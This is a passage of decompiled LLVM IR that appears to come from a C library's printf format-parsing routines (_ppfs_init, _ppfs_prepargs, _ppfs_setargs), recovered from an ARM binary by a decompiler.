  %stack_var_-316.3 = phi i32 [ %v0_12bec, %dec_label_pc_12b98 ], [ %v0_12f10, %dec_label_pc_12fec ], [ %v0_12bec, %dec_label_pc_12d74 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_12b98 ], [ %v2_12efc, %dec_label_pc_12fec ], [ %v2_12d78, %dec_label_pc_12d74 ]
  %v3_13004 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_13004, i32* @r4, align 4
  br label %dec_label_pc_13008

dec_label_pc_13008:                               ; preds = %dec_label_pc_12aa8, %dec_label_pc_13004
  %v0_13008 = phi i32 [ %v0_13008.pre, %dec_label_pc_12aa8 ], [ %v3_13004, %dec_label_pc_13004 ]
  %v0_12bec = phi i32 [ %tmp100, %dec_label_pc_12aa8 ], [ %stack_var_-316.3, %dec_label_pc_13004 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_12aa8 ], [ %stack_var_-336.3, %dec_label_pc_13004 ]
  store i32 %v0_13008, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ac0.outer

dec_label_pc_12ac0.outer:                         ; preds = %dec_label_pc_13010, %dec_label_pc_13008
  %v5_12aec = phi i32 [ %v1_12b1c, %dec_label_pc_13010 ], [ %v0_13008, %dec_label_pc_13008 ]
  %v0_12ac049 = phi i32 [ %v1_13010, %dec_label_pc_13010 ], [ %v0_13008, %dec_label_pc_13008 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_13010 ], [ %stack_var_-336.4, %dec_label_pc_13008 ]
  %v1_12ac0180 = inttoptr i32 %v0_12ac049 to i8*
  %v2_12ac0181 = load i8, i8* %v1_12ac0180, align 1
  %v3_12ac0182 = zext i8 %v2_12ac0181 to i32
  store i32 %v3_12ac0182, i32* %r3.global-to-local, align 4
  %v2_12ac4183 = icmp eq i8 %v2_12ac0181, 0
  br i1 %v2_12ac4183, label %dec_label_pc_12adc, label %bb126

dec_label_pc_13010:                               ; preds = %dec_label_pc_12b1c
  %v1_13010 = add i32 %v0_12b24, 2
  store i32 %v1_13010, i32* @r4, align 4
  br label %dec_label_pc_12ac0.outer

dec_label_pc_13018:                               ; preds = %dec_label_pc_12e88, %dec_label_pc_12fec, %.thread36, %dec_label_pc_12f38, %dec_label_pc_12f1c, %dec_label_pc_12dec, %bb162, %dec_label_pc_12d50, %bb130, %dec_label_pc_12fc8
  br label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %dec_label_pc_12b10, %bb, %dec_label_pc_12a90, %dec_label_pc_13018
  %stack_var_-336.5 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_12a90 ], [ -1, %dec_label_pc_13018 ], [ %stack_var_-336.2, %dec_label_pc_12b10 ]
  store i32 %stack_var_-336.5, i32* %r0.global-to-local, align 4
  store i32 %v6_12a4c, i32* @r5, align 4
  store i32 %v15_12a4c, i32* @r8, align 4
  store i32 %v18_12a4c, i32* @sb, align 4
  store i32 %v21_12a4c, i32* @sl, align 4
  store i32 %v24_12a4c, i32* @fp, align 4
  ret i32 %stack_var_-336.5

; uselistorder directives
  uselistorder i32 %stack_var_-336.5, { 1, 0 }
  uselistorder i32 %v1_13010, { 1, 0 }
  uselistorder i8 %v2_12ac0181, { 1, 2, 0 }
  uselistorder i32 %v0_12ac049, { 2, 0, 1 }
  uselistorder i32 %v5_12aec, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12bec, { 9, 12, 13, 2, 10, 8, 11, 6, 5, 4, 1, 0, 7, 3, 15, 14 }
  uselistorder i32 %v0_13008, { 1, 0, 2 }
  uselistorder i32 %v1_12f9c, { 2, 1, 0 }
  uselistorder i32 %v0_12fa4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12f24, { 1, 0 }
  uselistorder i32 %v2_12f08, { 2, 0, 1 }
  uselistorder i1 %v3_12ee8, { 1, 0 }
  uselistorder i32 %v0_12ef8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12ecc, { 1, 0 }
  uselistorder i32 %v0_12f10, { 1, 0, 2 }
  uselistorder i32 %v3_12ea0, { 1, 2, 0 }
  uselistorder i32 %v0_12e50, { 1, 0 }
  uselistorder i32 %v2_12e34, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12dfc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12dc8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12ccc, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v0_12ce8, { 1, 2, 3, 0 }
  uselistorder i32 %v6_12c68, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_12bcc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12b7c.pre, { 2, 1, 0 }
  uselistorder i32 %v1_12b74, { 1, 0 }
  uselistorder i32 %v1_12b1c, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-336.2, { 0, 8, 6, 1, 2, 5, 4, 3, 7 }
  uselistorder i32 %v2_12adc, { 1, 0 }
  uselistorder i32 %v1_12ad4.lcssa, { 1, 0 }
  uselistorder i8 %v2_12ac0, { 1, 2, 0 }
  uselistorder i32 %v2_12ad4, { 1, 2, 3, 0 }
  uselistorder i1 %v7_12ce0, { 1, 0 }
  uselistorder i1 %v7_12c2c, { 1, 2, 0 }
  uselistorder i1 %v7_12e24, { 1, 0 }
  uselistorder i1 %v7_12d84, { 1, 0 }
  uselistorder i1 %v7_12c70, { 1, 0 }
  uselistorder i32 %v2_12dc4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12e94, { 3, 2, 5, 4, 11, 10, 9, 7, 8, 6, 1, 0 }
  uselistorder i32* %v1_12ba4, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_12b78, { 2, 4, 3, 5, 0, 1 }
  uselistorder i32 %v2_12b58, { 1, 2, 0 }
  uselistorder i32 %v4_12b50, { 1, 0 }
  uselistorder i32 %v2_12a54, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-332, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-328, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %tmp103, { 2, 1, 0 }
  uselistorder i32 %tmp102, { 19, 18, 15, 13, 8, 9, 0, 10, 12, 11, 3, 4, 5, 6, 7, 1, 2, 17, 16, 14 }
  uselistorder i32 %tmp101, { 6, 5, 3, 2, 0, 4, 1 }
  uselistorder i32 %tmp97, { 2, 1, 3, 0 }
  uselistorder i32* %r3.global-to-local, { 39, 3, 4, 1, 2, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 38, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %r2.global-to-local, { 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 26, 20, 21, 23, 24, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 7, 6, 9, 8, 10, 11, 13, 12, 15, 14, 16, 17, 20, 18, 19, 22, 21, 24, 23, 26, 25, 28, 27, 32, 29, 30, 31, 2, 33, 34, 44, 35, 45, 1, 37, 36, 39, 38, 41, 40, 43, 42, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 55, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13020, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13018, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_13008, { 1, 0 }
  uselistorder label %dec_label_pc_12fc8, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %dec_label_pc_12f38, { 1, 0 }
  uselistorder label %.thread29, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_12ee4, { 1, 0 }
  uselistorder label %dec_label_pc_12ec8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12ec8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_12ebc, { 1, 0 }
  uselistorder label %dec_label_pc_12eac, { 0, 2, 1 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %dec_label_pc_12e40, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %bb157, { 4, 1, 2, 0, 3 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 4, 3, 1, 0, 2 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_12c1c, { 1, 0 }
  uselistorder label %dec_label_pc_12c18, { 2, 1, 0 }
  uselistorder label %bb139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b70, { 1, 0 }
  uselistorder label %bb134, { 1, 0 }
  uselistorder label %dec_label_pc_12b10, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_12adc, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_13040 = load i32, i32* @r4, align 4
  store i32 %v3_13040, i32* %stack_var_-12, align 4
  %v6_13040 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1304c = load i32, i32* @r1, align 4
  store i32 %v0_1304c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_13054 = bitcast i32* %arg1 to i8*
  %v3_13054 = call i32 @__GI_memset(i8* %v2_13054, i32 0)
  %v0_13058 = load i32, i32* @r4, align 4
  %v1_13058 = add i32 %v0_13058, 24
  %v2_13058 = inttoptr i32 %v1_13058 to i32*
  %v3_13058 = load i32, i32* %v2_13058, align 4
  %v1_1305c = add i32 %v3_13058, -1
  store i32 %v1_1305c, i32* %v2_13058, align 4
  %v0_13064 = load i32, i32* @r5, align 4
  %v1_13064 = load i32, i32* @r4, align 4
  %v2_13064 = inttoptr i32 %v1_13064 to i32*
  store i32 %v0_13064, i32* %v2_13064, align 4
  %v0_13068 = load i32, i32* @r4, align 4
  %v1_13068 = add i32 %v0_13068, 40
  store i32 %v1_13068, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_1307819 = inttoptr i32 %v1_13068 to i32*
  store i32 8, i32* %v2_1307819, align 4
  %v3_1307820 = load i32, i32* %r1.global-to-local, align 4
  %v4_1307821 = add i32 %v3_1307820, 4
  store i32 %v4_1307821, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13070.dec_label_pc_13070_crit_edge

dec_label_pc_13070.dec_label_pc_13070_crit_edge:  ; preds = %entry, %dec_label_pc_13070.dec_label_pc_13070_crit_edge
  %v4_1307822 = phi i32 [ %v4_1307821, %entry ], [ %v4_13078, %dec_label_pc_13070.dec_label_pc_13070_crit_edge ]
  %v0_13074.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13074 = add i32 %v0_13074.pre, -1
  store i32 %v1_13074, i32* %r2.global-to-local, align 4
  %v7_13074 = icmp eq i32 %v0_13074.pre, 1
  %v2_13078 = inttoptr i32 %v4_1307822 to i32*
  store i32 8, i32* %v2_13078, align 4
  %v3_13078 = load i32, i32* %r1.global-to-local, align 4
  %v4_13078 = add i32 %v3_13078, 4
  store i32 %v4_13078, i32* %r1.global-to-local, align 4
  br i1 %v7_13074, label %dec_label_pc_13080, label %dec_label_pc_13070.dec_label_pc_13070_crit_edge

dec_label_pc_13080:                               ; preds = %dec_label_pc_13070.dec_label_pc_13070_crit_edge
  %v0_13080 = load i32, i32* @r5, align 4
  store i32 %v0_13080, i32* %r2.global-to-local, align 4
  %v1_130c43 = inttoptr i32 %v0_13080 to i8*
  %v2_130c44 = load i8, i8* %v1_130c43, align 1
  %v2_130c86 = icmp eq i8 %v2_130c44, 0
  br i1 %v2_130c86, label %dec_label_pc_130d0, label %dec_label_pc_13090

dec_label_pc_13088:                               ; preds = %dec_label_pc_130a8
  %v2_1308c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1308c, i32* @r4, align 4
  store i32 %v6_13040, i32* @r5, align 4
  ret i32 -1

dec_label_pc_13090:                               ; preds = %dec_label_pc_13080, %dec_label_pc_130c4.backedge
  %v0_13098 = phi i32 [ %storemerge, %dec_label_pc_130c4.backedge ], [ %v0_13080, %dec_label_pc_13080 ]
  %v2_130c47 = phi i8 [ %v2_130c4, %dec_label_pc_130c4.backedge ], [ %v2_130c44, %dec_label_pc_13080 ]
  %v7_13090 = icmp eq i8 %v2_130c47, 37
  br i1 %v7_13090, label %dec_label_pc_13098, label %dec_label_pc_130c0

dec_label_pc_13098:                               ; preds = %dec_label_pc_13090
  %v1_13098 = add i32 %v0_13098, 1
  %v2_13098 = inttoptr i32 %v1_13098 to i8*
  %v3_13098 = load i8, i8* %v2_13098, align 1
  store i32 %v1_13098, i32* %r2.global-to-local, align 4
  %v7_1309c = icmp eq i8 %v3_13098, 37
  br i1 %v7_1309c, label %dec_label_pc_130c0, label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_13098
  %v0_130a0 = load i32, i32* @r4, align 4
  %v2_130a8 = inttoptr i32 %v0_130a0 to i32*
  store i32 %v1_13098, i32* %v2_130a8, align 4
  %v2_130ac = call i32 @_ppfs_parsespec(i32* %v2_130a8)
  %v1_130b0 = icmp slt i32 %v2_130ac, 0
  br i1 %v1_130b0, label %dec_label_pc_13088, label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_130a8
  %v0_130b8 = load i32, i32* @r4, align 4
  %v1_130b8 = inttoptr i32 %v0_130b8 to i32*
  %v2_130b8 = load i32, i32* %v1_130b8, align 4
  br label %dec_label_pc_130c4.backedge

dec_label_pc_130c0:                               ; preds = %dec_label_pc_13090, %dec_label_pc_13098
  %v0_130c0 = phi i32 [ %v0_13098, %dec_label_pc_13090 ], [ %v1_13098, %dec_label_pc_13098 ]
  %v1_130c0 = add i32 %v0_130c0, 1
  br label %dec_label_pc_130c4.backedge

dec_label_pc_130c4.backedge:                      ; preds = %dec_label_pc_130c0, %dec_label_pc_130b8
  %storemerge = phi i32 [ %v1_130c0, %dec_label_pc_130c0 ], [ %v2_130b8, %dec_label_pc_130b8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_130c4 = inttoptr i32 %storemerge to i8*
  %v2_130c4 = load i8, i8* %v1_130c4, align 1
  %v2_130c8 = icmp eq i8 %v2_130c4, 0
  br i1 %v2_130c8, label %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge, label %dec_label_pc_13090

dec_label_pc_130c4.dec_label_pc_130d0_crit_edge:  ; preds = %dec_label_pc_130c4.backedge
  %v0_130d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_130d0

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge, %dec_label_pc_13080
  %v0_130d0 = phi i32 [ %v0_130d0.pre, %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge ], [ %v0_13080, %dec_label_pc_13080 ]
  %v3_130c4.lcssa.in = phi i8 [ %v2_130c4, %dec_label_pc_130c4.dec_label_pc_130d0_crit_edge ], [ %v2_130c44, %dec_label_pc_13080 ]
  %v3_130c4.lcssa = zext i8 %v3_130c4.lcssa.in to i32
  %v1_130d0 = load i32, i32* @r4, align 4
  %v2_130d0 = inttoptr i32 %v1_130d0 to i32*
  store i32 %v0_130d0, i32* %v2_130d0, align 4
  %v2_130d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_130d4, i32* @r4, align 4
  store i32 %v6_13040, i32* @r5, align 4
  ret i32 %v3_130c4.lcssa

; uselistorder directives
  uselistorder i8 %v2_130c4, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_13080, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13078, { 1, 0 }
  uselistorder i32 %v0_13074.pre, { 1, 0 }
  uselistorder i32 %v6_13040, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder label %dec_label_pc_130c0, { 1, 0 }
  uselistorder label %dec_label_pc_13090, { 1, 0 }
  uselistorder label %dec_label_pc_13070.dec_label_pc_13070_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_130d8 = load i32, i32* @r4, align 4
  store i32 %v3_130d8, i32* %stack_var_-12, align 4
  %v1_130dc = add i32 %arg1, 24
  %v2_130dc = inttoptr i32 %v1_130dc to i32*
  %v3_130dc = load i32, i32* %v2_130dc, align 4
  store i32 %v3_130dc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_130ec = add i32 %arg1, 76
  %v3_130ec = inttoptr i32 %v2_130ec to i32*
  store i32 %arg2, i32* %v3_130ec, align 4
  %v7_130f0 = icmp sgt i32 %v3_130dc, 0
  br i1 %v7_130f0, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v10_130f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v10_130f0, i32* @r4, align 4
  ret i32 %arg1

bb4:                                              ; preds = %entry
  %v0_130f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_130f4 = add i32 %arg1, 8
  %v3_130f4 = inttoptr i32 %v2_130f4 to i32*
  store i32 %v0_130f4, i32* %v3_130f4, align 4
  %v0_130f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_130f8 = add i32 %arg1, 28
  %v3_130f8 = inttoptr i32 %v2_130f8 to i32*
  store i32 %v0_130f8, i32* %v3_130f8, align 4
  %v0_130fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_130fc, i32* %v2_130dc, align 4
  %v0_13100 = load i32, i32* %r3.global-to-local, align 4
  %v2_13100 = add i32 %arg1, 4
  %v3_13100 = inttoptr i32 %v2_13100 to i32*
  store i32 %v0_13100, i32* %v3_13100, align 4
  %v0_13104 = call i32 @_ppfs_setargs()
  %v0_13108 = load i32, i32* %r5.global-to-local, align 4
  %v1_13108 = load i32, i32* @r4, align 4
  %v2_13108 = add i32 %v1_13108, 24
  %v3_13108 = inttoptr i32 %v2_13108 to i32*
  store i32 %v0_13108, i32* %v3_13108, align 4
  %v2_1310c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1310c, i32* @r4, align 4
  ret i32 %v0_13104

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 5, 6, 2, 1, 3, 7 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_13110 = load i32, i32* @r0, align 4
  %v1_13110 = add i32 %v0_13110, 24
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* %r1.global-to-local, align 4
  %v2_13114 = icmp eq i32 %v3_13110, 0
  %v3_13118 = load i32, i32* @r4, align 4
  store i32 %v3_13118, i32* %stack_var_-8, align 4
  %v1_1311c = add i32 %v0_13110, 80
  store i32 %v1_1311c, i32* %ip.global-to-local, align 4
  %v1_13120 = add i32 %v0_13110, 8
  %v2_13120 = inttoptr i32 %v1_13120 to i32*
  %v3_13120 = load i32, i32* %v2_13120, align 4
  store i32 %v3_13120, i32* %r3.global-to-local, align 4
  %v6_13128 = icmp eq i32 %v3_13120, -2147483648
  br i1 %v2_13114, label %dec_label_pc_13128, label %dec_label_pc_1324c

dec_label_pc_13128:                               ; preds = %entry
  br i1 %v6_13128, label %dec_label_pc_13130, label %dec_label_pc_13148

dec_label_pc_13130:                               ; preds = %dec_label_pc_13128
  %v1_13130 = add i32 %v0_13110, 76
  %v2_13130 = inttoptr i32 %v1_13130 to i32*
  %v3_13130 = load i32, i32* %v2_13130, align 4
  store i32 %v3_13130, i32* %r3.global-to-local, align 4
  %v1_13134 = inttoptr i32 %v3_13130 to i32*
  %v2_13134 = load i32, i32* %v1_13134, align 4
  store i32 %v2_13134, i32* %r2.global-to-local, align 4
  %v1_13138 = add i32 %v3_13130, 4
  store i32 %v1_13138, i32* %r3.global-to-local, align 4
  store i32 %v1_13138, i32* %v2_13130, align 4
  %v0_13140 = load i32, i32* %r2.global-to-local, align 4
  %v1_13140 = load i32, i32* @r0, align 4
  %v2_13140 = add i32 %v1_13140, 8
  %v3_13140 = inttoptr i32 %v2_13140 to i32*
  store i32 %v0_13140, i32* %v3_13140, align 4
  %v0_13144 = load i32, i32* %r2.global-to-local, align 4
  %v1_13144 = load i32, i32* @r0, align 4
  %v2_13144 = add i32 %v1_13144, 80
  %v3_13144 = inttoptr i32 %v2_13144 to i32*
  store i32 %v0_13144, i32* %v3_13144, align 4
  %v0_13148.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13148

dec_label_pc_13148:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13130
  %v1_13160 = phi i32 [ %v0_13110, %dec_label_pc_13128 ], [ %v0_13148.pre, %dec_label_pc_13130 ]
  %v1_13148 = add i32 %v1_13160, 4
  %v2_13148 = inttoptr i32 %v1_13148 to i32*
  %v3_13148 = load i32, i32* %v2_13148, align 4
  store i32 %v3_13148, i32* %r3.global-to-local, align 4
  %v6_1314c = icmp eq i32 %v3_13148, -2147483648
  br i1 %v6_1314c, label %dec_label_pc_13154, label %dec_label_pc_1316c

dec_label_pc_13154:                               ; preds = %dec_label_pc_13148
  %v1_13154 = add i32 %v1_13160, 76
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  %v3_13154 = load i32, i32* %v2_13154, align 4
  store i32 %v3_13154, i32* %r3.global-to-local, align 4
  %v1_13158 = inttoptr i32 %v3_13154 to i32*
  %v2_13158 = load i32, i32* %v1_13158, align 4
  store i32 %v2_13158, i32* %r2.global-to-local, align 4
  %v1_1315c = add i32 %v3_13154, 4
  store i32 %v1_1315c, i32* %r3.global-to-local, align 4
  store i32 %v1_1315c, i32* %v2_13154, align 4
  %v0_13164 = load i32, i32* %r2.global-to-local, align 4
  %v1_13164 = load i32, i32* @r0, align 4
  %v2_13164 = add i32 %v1_13164, 4
  %v3_13164 = inttoptr i32 %v2_13164 to i32*
  store i32 %v0_13164, i32* %v3_13164, align 4
  %v0_13168 = load i32, i32* %r2.global-to-local, align 4
  %v1_13168 = load i32, i32* @r0, align 4
  %v2_13168 = add i32 %v1_13168, 80
  %v3_13168 = inttoptr i32 %v2_13168 to i32*
  store i32 %v0_13168, i32* %v3_13168, align 4
  %v0_1323c18.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_13148, %dec_label_pc_13154
  %v0_1323c18 = phi i32 [ %v1_13160, %dec_label_pc_13148 ], [ %v0_1323c18.pre, %dec_label_pc_13154 ]
  %v0_1316c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1316c, i32* %lr.global-to-local, align 4
  %v1_1323c19 = add i32 %v0_1323c18, 28
  %v2_1323c20 = inttoptr i32 %v1_1323c19 to i32*
  %v3_1323c21 = load i32, i32* %v2_1323c20, align 4
  store i32 %v3_1323c21, i32* %r3.global-to-local, align 4
  %v5_1324423 = icmp slt i32 %v0_1316c, %v3_1323c21
  br i1 %v5_1324423, label %dec_label_pc_13174, label %dec_label_pc_13248.loopexit

dec_label_pc_13174:                               ; preds = %dec_label_pc_1316c, %dec_label_pc_13238
  %v0_1323c25 = phi i32 [ %v0_1323c, %dec_label_pc_13238 ], [ %v0_1323c18, %dec_label_pc_1316c ]
  %v1_1317424 = phi i32 [ %v1_13238, %dec_label_pc_13238 ], [ %v0_1316c, %dec_label_pc_1316c ]
  %v4_13174 = mul i32 %v1_1317424, 4
  %v5_13174 = add i32 %v0_1323c25, %v4_13174
  store i32 %v5_13174, i32* %r3.global-to-local, align 4
  %v1_13178 = add i32 %v5_13174, 40
  %v2_13178 = inttoptr i32 %v1_13178 to i32*
  %v3_13178 = load i32, i32* %v2_13178, align 4
  store i32 %v3_13178, i32* %r2.global-to-local, align 4
  %v7_1317c = icmp eq i32 %v3_13178, 8
  br i1 %v7_1317c, label %dec_label_pc_13238, label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_13174
  %v1_13184 = add i32 %v0_1323c25, 76
  %v2_13184 = inttoptr i32 %v1_13184 to i32*
  %v3_13184 = load i32, i32* %v2_13184, align 4
  store i32 %v3_13184, i32* %r1.global-to-local, align 4
  %v8_13188 = icmp sgt i32 %v3_13178, 8
  br i1 %v8_13188, label %dec_label_pc_131ac, label %dec_label_pc_1318c

dec_label_pc_1318c:                               ; preds = %dec_label_pc_13184
  %v7_1318c = icmp eq i32 %v3_13178, 2
  br i1 %v7_1318c, label %dec_label_pc_131f8, label %dec_label_pc_13194

dec_label_pc_13194:                               ; preds = %dec_label_pc_1318c
  %v8_13194 = icmp sgt i32 %v3_13178, 2
  br i1 %v8_13194, label %dec_label_pc_131a4, label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_13194
  %v1_13198 = icmp slt i32 %v3_13178, 0
  br i1 %v1_13198, label %dec_label_pc_13224, label %dec_label_pc_131f8

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13194
  %v7_131a4 = icmp eq i32 %v3_13178, 7
  br i1 %v7_131a4, label %dec_label_pc_1320c, label %dec_label_pc_13224

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13184
  %v7_131ac = icmp eq i32 %v3_13178, 1024
  br i1 %v7_131ac, label %dec_label_pc_131f8, label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_131ac
  %v8_131b4 = icmp sgt i32 %v3_13178, 1024
  br i1 %v8_131b4, label %dec_label_pc_131cc, label %dec_label_pc_131b8

dec_label_pc_131b8:                               ; preds = %dec_label_pc_131b4
  switch i32 %v3_13178, label %dec_label_pc_13224 [
    i32 256, label %dec_label_pc_131f8
    i32 512, label %dec_label_pc_131f8
  ]

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131b4
  %v7_131cc = icmp eq i32 %v3_13178, 2048
  br i1 %v7_131cc, label %dec_label_pc_131e4, label %dec_label_pc_131dc

dec_label_pc_131dc:                               ; preds = %dec_label_pc_131cc
  store i32 2055, i32* %r3.global-to-local, align 4
  %v9_131d8 = icmp eq i32 %v3_13178, 2055
  br i1 %v9_131d8, label %dec_label_pc_1320c, label %dec_label_pc_13224

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131cc
  %v1_131e4 = add i32 %v3_13184, 8
  store i32 %v1_131e4, i32* %r3.global-to-local, align 4
  store i32 %v1_131e4, i32* %v2_13184, align 4
  %v0_131ec = load i32, i32* %r1.global-to-local, align 4
  %v1_131ec = inttoptr i32 %v0_131ec to i32*
  %v2_131ec = load i32, i32* %v1_131ec, align 4
  store i32 %v2_131ec, i32* %r3.global-to-local, align 4
  %v3_131ec = add i32 %v0_131ec, 4
  %v4_131ec = inttoptr i32 %v3_131ec to i32*
  %v5_131ec = load i32, i32* %v4_131ec, align 4
  store i32 %v5_131ec, i32* %r4.global-to-local, align 4
  %v0_131f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_131f0 = inttoptr i32 %v0_131f0 to i32*
  store i32 %v2_131ec, i32* %v1_131f0, align 4
  %v3_131f0 = add i32 %v0_131f0, 4
  %v4_131f0 = inttoptr i32 %v3_131f0 to i32*
  %v5_131f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_131f0, i32* %v4_131f0, align 4
  br label %dec_label_pc_13234

dec_label_pc_131f8:                               ; preds = %dec_label_pc_131b8, %dec_label_pc_131b8, %dec_label_pc_13198, %dec_label_pc_131ac, %dec_label_pc_1318c
  %v1_131f8 = inttoptr i32 %v3_13184 to i32*
  %v2_131f8 = load i32, i32* %v1_131f8, align 4
  store i32 %v2_131f8, i32* %r2.global-to-local, align 4
  %v1_131fc = add i32 %v3_13184, 4
  store i32 %v1_131fc, i32* %r3.global-to-local, align 4
  store i32 %v1_131fc, i32* %v2_13184, align 4
  %v0_13204 = load i32, i32* %r2.global-to-local, align 4
  %v1_13204 = load i32, i32* %ip.global-to-local, align 4
  %v2_13204 = inttoptr i32 %v1_13204 to i32*
  store i32 %v0_13204, i32* %v2_13204, align 4
  br label %dec_label_pc_13234

dec_label_pc_1320c:                               ; preds = %dec_label_pc_131a4, %dec_label_pc_131dc
  %v3_1320c = load i32, i32* %v2_13184, align 4
  store i32 %v3_1320c, i32* %r3.global-to-local, align 4
  %v1_13210 = inttoptr i32 %v3_1320c to i32*
